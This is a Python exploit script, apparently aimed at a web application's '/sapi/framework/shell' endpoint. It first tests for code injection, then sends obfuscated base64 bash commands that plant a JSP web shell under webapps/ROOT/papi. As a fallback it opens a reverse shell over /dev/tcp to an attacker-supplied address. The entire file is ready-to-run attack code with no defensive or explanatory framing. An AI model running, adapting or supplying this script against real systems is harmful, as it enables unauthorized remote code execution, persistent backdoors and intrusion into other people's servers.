import sys
import base64
import requests

echo_shell_to_tmp_base64 = '''ZWNobyBKSHNpSWxzaVoyVjBRMnhoYzNNaVhTZ3BXM0JoY21GdExtWnVYU2h3WVhKaGJTNXpaVzBwVzNCaGNtRnRMbTVwWFNncFczQmhjbUZ0TG1kbFlsMG9Ja3BoZG1GVFkzSnBjSFFpS1ZzaVpYWmhiQ0pkS0hCaGNtRnRMbU50WkNsOUNnPT0gPiAvdG1wL3NoZWxsCg=='''
mkdir_papi_base64 = '''bWtkaXIgL29wdC9lMTAvZTEwLXNlcnZlcjAvRTEwL3dlYmFwcHMvUk9PVC9wYXBpCg=='''
write_shell_to_papi_base64 = '''Y2F0IC90bXAvc2hlbGwgfCBiYXNlNjQgLWQgPiAvb3B0L2UxMC9lMTAtc2VydmVyMC9FMTAvd2ViYXBwcy9ST09UL3BhcGkvc2hlbGwuanNwCg=='''


def format_payload(p):
    return '''"bash -c {echo,''' + p + '''}|{base64,-d}|{bash,-i}".execute().text'''


def poc(target):
    vul_path = target + "/sapi/framework/shell"
    payload = {"_token": "123456789",
               "content": "7*7",
               "result": "x"}
    res = requests.post(vul_path, verify=False, data=payload)
    if res and res.status_code == 200 and "49" in res.text:
        print("Target Vulnerable!")
        return True
    else:
        print("Target May not be vulnerable")

    return False


def exp1(target):
    vul_path = target + "/sapi/framework/shell"
    payload = {"_token": "123456789", "content": format_payload(echo_shell_to_tmp_base64), "result": "x"}
    res = requests.post(vul_path, verify=False, data=payload)
    if res and res.status_code == 200:
        payload["content"] = format_payload(mkdir_papi_base64)
        res = requests.post(vul_path, verify=False, data=payload)
        if res and res.status_code == 200:
            payload["content"] = format_payload(write_shell_to_papi_base64)
            res = requests.post(vul_path, verify=False, data=payload)
            if res and res.status_code == 200:
                shell_path = target + "/papi/shell.jsp"
                res = requests.get(shell_path, verify=False)
                if res and res.status_code == 200:
                    print("Exploit Finished")
                    print("shell_path: " + shell_path + "?fn=forName&sem=javax.script.ScriptEngineManager&ni=newInstance&geb=getEngineByName")
                    return True

    print("Exp1 went wrong! About to try exp2")
    return False


def exp2(target, address):
    address = address.split(":")
    reverse_shell_cmd = 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(address[0], address[1])
    reverse_shell_cmd_base64 = str(base64.b64encode(reverse_shell_cmd.encode()))[2:-1]
    vul_path = target + "/sapi/framework/shell"
    payload = {"_token": "123456789", "content": format_payload(reverse_shell_cmd_base64), "result": "x"}
    res = requests.post(vul_path, verify=False, data=payload)
    if res and res.status_code == 200:
        print("Exploit Finished! Should got a reverse shell")
        return True

    print("Exp2 went wrong!")
    return False


if __name__ == '__main__':
    url, addr = sys.argv[1], sys.argv[2]
    print("trying " + url + " with reverse addr " + addr)
    if url.endswith("/"):
        url = url[:-1]
    if poc(url):
        if exp1(url):
            exit()
        if exp2(url, addr):
            exit()

    print("Something went wrong!")
